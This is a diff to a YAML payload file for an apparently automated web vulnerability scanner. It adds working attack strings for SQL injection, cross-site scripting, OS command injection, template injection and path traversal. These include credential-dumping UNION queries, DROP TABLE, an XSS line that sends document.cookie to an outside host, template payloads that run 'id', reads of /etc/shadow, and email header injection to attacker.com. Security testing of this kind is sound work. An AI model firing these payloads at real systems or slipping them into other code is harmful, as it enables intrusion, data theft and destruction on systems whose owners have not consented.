@@ -3,88 +3,177 @@
 # and LLM generation is unavailable or disabled.
 
 sqli:
-  # Basic detection
+  # ── Basic error probes ───────────────────────────────────────────
   - "'"
   - "''"
+  - "\""
   - "\"'"
-  # Error-based
+  - "`"
+  - "\\'"
+  # ── Classic OR-based bypass ──────────────────────────────────────
   - "' OR '1'='1"
   - "' OR '1'='1' --"
   - "' OR '1'='1' /*"
   - "' OR '1'='1' #"
   - "\" OR \"1\"=\"1"
+  - "\" OR \"1\"=\"1\"--"
   - ") OR ('1'='1"
   - ") OR 1=1--"
   - "1 OR 1=1"
+  - "1 OR 1=1--"
   - "admin'--"
   - "admin' #"
+  - "admin'/*"
   - "' OR 1=1--"
   - "' OR 1=1#"
   - "' OR 1=1/*"
-  # UNION-based
+  # ── UNION-based ──────────────────────────────────────────────────
   - "' UNION SELECT NULL--"
   - "' UNION SELECT NULL,NULL--"
   - "' UNION SELECT NULL,NULL,NULL--"
   - "-1 UNION SELECT 1,2,3--"
   - "1' UNION ALL SELECT NULL,NULL,NULL--"
-  # ORDER BY (column count detection)
+  - "' UNION SELECT @@version,NULL--"
+  - "' UNION SELECT user(),NULL--"
+  - "1 UNION SELECT 1,username,password FROM users--"
+  - "' UNION SELECT table_name,NULL FROM information_schema.tables--"
+  # ── ORDER BY (column count detection) ───────────────────────────
   - "1' ORDER BY 1--"
   - "1' ORDER BY 2--"
   - "1' ORDER BY 3--"
-  # Blind (boolean-based)
+  - "1' ORDER BY 5--"
+  - "1' ORDER BY 10--"
+  # ── Boolean-based blind ──────────────────────────────────────────
   - "1' AND '1'='1"
   - "1' AND '1'='2"
   - "1 AND 1=1"
   - "1 AND 1=2"
-  # Time-based blind
+  - "1' AND SUBSTRING(username,1,1)='a'--"
+  - "1' AND LENGTH(password)>0--"
+  # ── Time-based blind ─────────────────────────────────────────────
   - "1' AND SLEEP(3)--"
+  - "1 AND SLEEP(3)"
+  - "'; WAITFOR DELAY '0:0:3'--"
   - "1; WAITFOR DELAY '0:0:3'--"
-  - "1' AND BENCHMARK(3000000,MD5('a'))--"
-  # Stacked queries
+  - "1' AND BENCHMARK(5000000,MD5('a'))--"
+  - "1' AND (SELECT 1 FROM (SELECT(SLEEP(3)))a)--"
+  - "1; SELECT pg_sleep(3)--"
+  - "1' OR SLEEP(3)--"
+  # ── Stacked queries ───────────────────────────────────────────────
   - "'; DROP TABLE users--"
+  - "'; INSERT INTO users(username,password) VALUES('wscan','wscan')--"
   - "1; SELECT * FROM information_schema.tables--"
-  # Version fingerprint
+  # ── Error-based (MySQL) ───────────────────────────────────────────
+  - "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version)))--"
+  - "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version),0x7e),1)--"
+  - "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT @@version),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
+  - "1 AND EXTRACTVALUE(0,CONCAT(0x0a,(SELECT database())))--"
+  # ── Error-based (MSSQL) ───────────────────────────────────────────
   - "' AND 1=CONVERT(int,@@version)--"
-  - "' AND 1=CONVERT(int,(SELECT @@version))--"
+  - "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--"
+  # ── Error-based (Oracle) ──────────────────────────────────────────
+  - "' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))--"
+  - "' OR 1=UTL_HTTP.REQUEST('http://x')--"
+  # ── WAF bypass — inline comments ─────────────────────────────────
+  - "' /*!UNION*/ /*!SELECT*/ NULL--"
+  - "'/**/OR/**/1=1--"
+  - "' OR/**/ 1=1--"
+  - "' /*!50000OR*/ 1=1--"
+  - "1'%09OR%091=1--"
+  - "1' OR%0a1=1--"
+  # ── WAF bypass — case variation ───────────────────────────────────
+  - "' UniOn SeLeCt NULL--"
+  - "' uNiOn aLl sElEcT NULL--"
+  # ── Second-order / out-of-band markers ───────────────────────────
+  - "1' AND LOAD_FILE('/etc/passwd')--"
+  - "' INTO OUTFILE '/tmp/wscan_test.txt'--"
+  # ── NoSQL (MongoDB-style JSON injection) ──────────────────────────
+  - "{\"$gt\":\"\"}"
+  - "{\"$ne\":null}"
+  - "{\"$regex\":\".*\"}"
+  - "'; return db.getCollectionNames();//"
+  - "\" || 1==1//"
 
 xss:
-  # Basic script injection
+  # ── Basic script injection ────────────────────────────────────────
   - "<script>alert('XSS')</script>"
   - "<script>alert(document.cookie)</script>"
   - "<script>alert(1)</script>"
-  # Attribute injection
+  - "<script>alert(document.domain)</script>"
+  # ── Attribute injection ───────────────────────────────────────────
   - "\"'><script>alert('XSS')</script>"
   - "'\"><script>alert('XSS')</script>"
   - "'><img src=x onerror=alert('XSS')>"
-  # Event handlers
+  - "\"><img src=x onerror=alert(1)>"
+  # ── img / svg / video event handlers ─────────────────────────────
   - "<img src=x onerror=alert('XSS')>"
   - "<img src=x onerror=\"alert('XSS')\">"
+  - "<img src=1 onerror=alert(1)>"
   - "<svg onload=alert('XSS')>"
   - "<svg onload=\"alert('XSS')\">"
+  - "<svg><script>alert(1)</script></svg>"
+  - "<video src=x onerror=alert(1)>"
+  - "<audio src=x onerror=alert(1)>"
   - "<body onload=alert('XSS')>"
   - "<input autofocus onfocus=alert('XSS')>"
   - "<details open ontoggle=alert('XSS')>"
   - "<select autofocus onfocus=alert('XSS')>"
-  # JavaScript protocol
+  - "<textarea autofocus onfocus=alert('XSS')>"
+  - "<keygen autofocus onfocus=alert('XSS')>"
+  - "<marquee onstart=alert('XSS')>"
+  # ── SVG advanced ─────────────────────────────────────────────────
+  - "<svg><animate onbegin=alert(1) attributeName=x></svg>"
+  - "<svg><set attributeName=onmouseover value=alert(1)></svg>"
+  - "<svg/onload=alert(1)>"
+  - "<svg><use href=\"data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg'><script>alert(1)</script></svg>#x\"></use></svg>"
+  # ── JavaScript protocol ───────────────────────────────────────────
   - "javascript:alert('XSS')"
   - "JAVASCRIPT:alert('XSS')"
-  # IFrame
+  - "javascript:alert`XSS`"
+  - "java&#x0D;&#x0A;script:alert(1)"
+  - "j&#x61;v&#x61;script:alert(1)"
+  # ── IFrame ────────────────────────────────────────────────────────
   - "<iframe src=javascript:alert('XSS')>"
   - "<iframe onload=alert('XSS')>"
-  # Filter bypass
+  - "<iframe srcdoc=\"<script>alert(1)</script>\">"
+  # ── Template / framework injection ───────────────────────────────
+  - "{{constructor.constructor('alert(1)')()}}"
+  - "${alert(1)}"
+  - "#{alert(1)}"
+  # ── Filter bypass — encoding ──────────────────────────────────────
   - "<<SCRIPT>alert('XSS');//<</SCRIPT>"
   - "<IMG SRC=j&#X41;vascript:alert('XSS')>"
   - "<IMG SRC=\"jav\tascript:alert('XSS');\">"
   - "<IMG SRC=\"jav&#x09;ascript:alert('XSS');\">"
   - "%3Cscript%3Ealert('XSS')%3C/script%3E"
   - "&#x3C;script&#x3E;alert('XSS')&#x3C;/script&#x3E;"
-  # DOM XSS
+  - "&#60;script&#62;alert(1)&#60;/script&#62;"
+  - "\\x3cscript\\x3ealert(1)\\x3c/script\\x3e"
+  # ── Filter bypass — null byte / slash variants ────────────────────
+  - "<scr\0ipt>alert('XSS')</scr\0ipt>"
+  - "<scr%00ipt>alert('XSS')</scr%00ipt>"
+  - "<sc<!---->ript>alert('XSS')</sc<!---->ript>"
+  - "<SCRIPT/SRC=x>alert(1)</SCRIPT>"
+  # ── DOM XSS probes ────────────────────────────────────────────────
   - "#<script>alert('XSS')</script>"
   - "';alert('XSS');//"
   - "\";alert('XSS');//"
+  - "'-alert(1)-'"
+  - "\"-alert(1)-\""
+  # ── Polyglot (HTML + JS + attribute context) ──────────────────────
+  - "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e"
+  - "'\"`><svg onload=alert(1)>/*"
+  - "\"><img src=x onerror=alert(1)><!--"
+  - "</script><script>alert(1)</script>"
+  # ── CSS injection / expression ────────────────────────────────────
+  - "<style>@import'javascript:alert(1)'</style>"
+  - "<div style=\"background:url(javascript:alert(1))\">"
+  # ── Stored XSS with external load ────────────────────────────────
+  - "<script src=//x.com/x.js></script>"
+  - "<img src=x onerror=\"this.src='//x.com/'+document.cookie\">"
 
 os_injection:
-  # Unix/Linux
+  # ── Unix / Linux basic ────────────────────────────────────────────
   - "; ls -la"
   - "| ls -la"
   - "& ls -la"
@@ -97,37 +186,71 @@ os_injection:
   - "| id"
   - "; cat /etc/passwd"
   - "| cat /etc/passwd"
+  - "; cat /etc/shadow"
+  - "| cat /etc/shadow"
   - "; uname -a"
   - "| uname -a"
   - "; env"
   - "| env"
-  # Windows
+  - "; printenv"
+  - "; hostname"
+  - "; ifconfig"
+  - "; netstat -an"
+  - "; ps aux"
+  # ── Windows ───────────────────────────────────────────────────────
   - "; dir"
   - "| dir"
   - "& dir"
   - "&& dir"
-  - "; whoami"
   - "| type C:\\Windows\\win.ini"
   - "& type C:\\Windows\\win.ini"
   - "; ipconfig"
   - "| ipconfig"
-  # Command substitution
+  - "| net user"
+  - "& systeminfo"
+  - "; cmd /c whoami"
+  # ── Command substitution ──────────────────────────────────────────
   - "`whoami`"
   - "$(whoami)"
   - "`id`"
   - "$(id)"
   - "`cat /etc/passwd`"
-  # Newline injection
+  - "$(cat /etc/passwd)"
+  - "`uname -a`"
+  # ── Newline injection ─────────────────────────────────────────────
   - "\n whoami"
   - "\r\n whoami"
-  # Blind (time-based)
+  - "%0a whoami"
+  - "%0d%0a whoami"
+  # ── Blind (time-based) ────────────────────────────────────────────
   - "; ping -c 3 127.0.0.1"
   - "| ping -c 3 127.0.0.1"
   - "& ping -n 3 127.0.0.1"
   - "; sleep 3"
   - "| sleep 3"
+  - "$(sleep 3)"
+  - "`sleep 3`"
+  - "; timeout 3"
+  # ── IFS / whitespace bypass ───────────────────────────────────────
+  - ";${IFS}whoami"
+  - "|${IFS}id"
+  - ";{cat,/etc/passwd}"
+  - ";cat${IFS}/etc/passwd"
+  - ";ca''t${IFS}/etc/passwd"
+  # ── Semicolon-less separators ─────────────────────────────────────
+  - "||whoami"
+  - "||id||"
+  - "&&whoami&&"
+  # ── Base64-encoded command ────────────────────────────────────────
+  - "| bash -c 'echo d2hvYW1p|base64 -d|bash'"
+  - ";echo${IFS}d2hvYW1p|base64${IFS}-d|bash"
+  # ── Environment variable exfil markers ───────────────────────────
+  - "; echo $PATH"
+  - "| echo $HOME"
+  - "| echo $USER"
 
 ssti:
+  # ── Generic math probes (engine-agnostic) ────────────────────────
   - "{{7*7}}"
   - "${7*7}"
   - "<%= 7*7 %>"
@@ -136,37 +259,129 @@ ssti:
   - "*{7*7}"
   - "%{7*7}"
   - "[[${7*7}]]"
+  # ── Jinja2 / Twig / Flask ─────────────────────────────────────────
   - "{{config}}"
-  - "${''class''}"
+  - "{{config.items()}}"
+  - "{{self.__dict__}}"
+  - "{{request}}"
+  - "{{request.environ}}"
+  - "{{''.__class__.__mro__[1].__subclasses__()}}"
+  - "{{''.__class__.__mro__[2].__subclasses__()}}"
+  - "{{7*7}}{{config}}"
+  - "{% debug %}"
+  - "{% for key, value in config.items() %}{{ key }}:{{ value }}\n{% endfor %}"
+  # ── Jinja2 RCE probes ─────────────────────────────────────────────
+  - "{{''.__class__.__mro__[1].__subclasses__()[408]('id',shell=True,stdout=-1).communicate()[0].strip()}}"
+  - "{{request|attr('application')|attr('\\x5f\\x5fglobals\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fbuiltins\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fimport\\x5f\\x5f')('os')|attr('popen')('id')|attr('read')()}}"
+  # ── Twig ──────────────────────────────────────────────────────────
+  - "{{_self.env.registerUndefinedFilterCallback(\"exec\")}}"
+  - "{{_self.env.getFilter(\"id\")}}"
+  - "{{['id']|filter('system')}}"
+  # ── Smarty (PHP) ──────────────────────────────────────────────────
+  - "{php}echo shell_exec('id');{/php}"
+  - "{system('id')}"
+  - "{if system('id')}{/if}"
+  # ── FreeMarker (Java) ─────────────────────────────────────────────
+  - "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}"
+  - "${\"freemarker.template.utility.Execute\"?new()(\"id\")}"
+  - "[#assign ex = 'freemarker.template.utility.Execute'?new()]${ex('id')}"
+  # ── Velocity (Java) ───────────────────────────────────────────────
+  - "#set($str=$class.inspect(\"java.lang.String\").type)"
+  - "#set($x=$str.format('${'+'#set($x=1)'+'}'))"
+  # ── Mako / Cheetah (Python) ──────────────────────────────────────
+  - "${__import__('os').popen('id').read()}"
+  - "<%\nimport os\nx=os.popen('id').read()\n%>${x}"
+  # ── Expression Language (Spring / Java EE) ───────────────────────
+  - "${7*7}"
+  - "T(java.lang.Runtime).getRuntime().exec('id')"
+  - "${T(java.lang.System).getenv()}"
+  - "#{T(java.lang.Runtime).getRuntime().exec('id')}"
+  # ── Pebble (Java) ────────────────────────────────────────────────
+  - "{%set cmd = 'id'%}{{cmd}}"
+  - "{{ '' | upper }}"
 
 header_injection:
+  # ── CRLF injection ────────────────────────────────────────────────
   - "\r\nX-WscanHdrInject: 1"
   - "%0d%0aX-WscanHdrInject:%201"
   - "%0aX-WscanHdrInject:%201"
   - "\nX-WscanHdrInject: 1"
-  - "%0d%0a X-WscanHdrInject:%201"
+  - "%0d%0a%20X-WscanHdrInject:%201"
   - "\r\nSet-Cookie: wscan_session=injected; Path=/"
+  - "%0d%0aSet-Cookie:%20wscan_session=injected"
+  # ── Response splitting ────────────────────────────────────────────
+  - "\r\n\r\n<html><body>WSCAN_SPLIT</body></html>"
+  - "%0d%0a%0d%0a<script>alert(1)</script>"
+  # ── Email header injection ────────────────────────────────────────
+  - "test@example.com\r\nBcc: wscan@attacker.com"
+  - "test@example.com%0aCC:wscan@attacker.com"
+  - "test@example.com\nSubject: injected_subject"
+  # ── Host header injection ─────────────────────────────────────────
+  - "evil.com"
+  - "localhost"
 
 path_traversal:
-  # Unix — /etc/passwd
+  # ── Unix — /etc/passwd ────────────────────────────────────────────
   - "../../../etc/passwd"
   - "../../etc/passwd"
   - "../etc/passwd"
+  - "../../../../etc/passwd"
+  - "../../../../../etc/passwd"
+  # ── URL-encoded ───────────────────────────────────────────────────
   - "..%2F..%2F..%2Fetc%2Fpasswd"
   - "..%2f..%2f..%2fetc%2fpasswd"
-  - "....//....//....//etc//passwd"
   - "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
   - "%252e%252e%252fetc%252fpasswd"
+  - "%252e%252e%252f%252e%252e%252fetc%252fpasswd"
+  # ── Double-encoded ────────────────────────────────────────────────
+  - "..%255c..%255c..%255cetc%255cpasswd"
   - "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"
-  # Unix — /etc/hosts
+  - "..%c1%9c..%c1%9cetc%c1%9cpasswd"
+  # ── Dot-dot-slash tricks ──────────────────────────────────────────
+  - "....//....//....//etc//passwd"
+  - "....\\\\....\\\\....\\\\etc\\\\passwd"
+  - "..\\/..\\/..\\/etc\\/passwd"
+  # ── Null byte injection ───────────────────────────────────────────
+  - "../../../etc/passwd%00"
+  - "../../../etc/passwd%00.png"
+  - "../../../etc/passwd\x00"
+  # ── Unix — other sensitive files ──────────────────────────────────
   - "../../../etc/hosts"
-  - "..%2F..%2F..%2Fetc%2Fhosts"
-  # Windows
+  - "../../../etc/shadow"
+  - "../../../etc/group"
+  - "../../../proc/self/environ"
+  - "../../../proc/version"
+  - "../../../var/log/apache2/access.log"
+  - "../../../var/log/nginx/access.log"
+  - "../../../../../../var/www/html/index.php"
+  # ── Windows ───────────────────────────────────────────────────────
   - "..\\..\\..\\windows\\win.ini"
   - "..%5C..%5C..%5Cwindows%5Cwin.ini"
   - "..%5c..%5c..%5cwindows%5cwin.ini"
   - "../../../../boot.ini"
   - "..%2F..%2F..%2F..%2Fboot.ini"
+  - "C:\\Windows\\win.ini"
+  - "C:/Windows/win.ini"
+  # ── Absolute path bypass ──────────────────────────────────────────
+  - "/etc/passwd"
+  - "/etc/shadow"
+  - "/proc/self/environ"
+
+open_redirect:
+  - "//evil.com"
+  - "https://evil.com"
+  - "//evil.com/%2f.."
+  - "/\\evil.com"
+  - "///evil.com"
+  - "////evil.com"
+  - "https:evil.com"
+  - "https://evil.com/fake"
+  - "//google.com@evil.com"
+  - "javascript:alert(1)"
+  - "%2F%2Fevil.com"
+  - "%5C%5Cevil.com"
+  - "\tevil.com"
+  - "\nevil.com"
 
 # LLM prompt templates for context-aware payload generation
 llm_prompts:
